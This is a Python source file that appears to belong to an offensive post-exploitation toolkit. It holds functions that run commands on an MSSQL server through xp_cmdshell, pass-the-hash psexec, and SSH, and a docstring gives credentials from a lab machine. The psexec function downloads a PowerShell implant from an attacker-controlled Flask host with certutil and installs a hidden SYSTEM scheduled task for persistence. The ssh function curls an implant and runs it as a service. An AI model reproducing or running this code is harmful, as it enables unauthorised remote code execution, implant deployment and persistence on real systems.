import pwn
import hashlib, binascii
import base64
import paramiko
import os
import random

# Custom imports
import implants

"""
With valid credentials and correct permissions, execute commands on remote MSSQL server

Example usage (Tested on HTB Querier):
    username = "mssql-svc"
    password = "corporate568"
    target = "10.10.10.125"
    command = "ping 10.10.14.10"
    print(mssql_rce(username, password, target, command))
"""
def mssql_rce(username, password, target, command):
    p = pwn.process(["/usr/bin/impacket-mssqlclient", "-windows-auth", f"{username}:{password}@{target}"], stdin=pwn.PTY)
    p.readuntil(")>")
    p.send(b"enable_xp_cmdshell\n")
    p.send(b'\4')
    p.readuntil("install.")
    p.readuntil("install.")
    p.send(f"xp_cmdshell {command}\n")
    p.send(b'\4')
    p.readuntil("NULL")
    output = p.readuntil("NULL")
    decoded_output = output.decode('utf-8')
    cleaned_output = decoded_output.replace('NULL', '').strip()
    return cleaned_output

"""
With valid credentials, psexec and run implant code
"""
def psexec(username, password, target, FLASK_HOST, FLASK_PORT):
    ntlm = binascii.hexlify(hashlib.new('md4', password.encode('utf-16le')).digest()).decode(encoding="utf-8")
    rnum = random.randint(1, 1000)
    cmd = f'certutil.exe -f -split -urlcache http://{FLASK_HOST}:{FLASK_PORT}/static/win.ps1 C:\\programdata\\win.ps1; schtasks /create /tn "agent{rnum}" /tr "powershell -nop -w hidden C:\\Programdata\\win.ps1" /sc onstart /ru system /rl highest /f; schtasks /run /tn "agent{rnum}"'
    b64 = base64.b64encode(cmd.encode("utf-16")[2:]).decode("utf-8")
    os_cmd = f"/usr/bin/impacket-psexec -hashes :{ntlm} {username}@{target} 'powershell -e {b64}'"
    print(os_cmd)
    os.system(os_cmd)

"""
WIth valid credentials, ssh and run implant code
"""
def ssh(username, password, target, FLASK_HOST, FLASK_PORT):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Connect to the server
    try:
        client.connect(target, port=22, username=username, password=password)
        print("Connection successful!")

        # Run a command
        command = f"curl -s http://{FLASK_HOST}:{FLASK_PORT}/static/lin > /tmp/agent;systemd-run --unit=agent bash /tmp/agent"
        stdin, stdout, stderr = client.exec_command(command)

        # Close the connection
        client.close()

    except Exception as e:
        print(f"Error occurred: {e}")

if __name__=="__main__":
    psexec("administrator", "password", "192.168.108.100", "192.168.108.15", "5000")
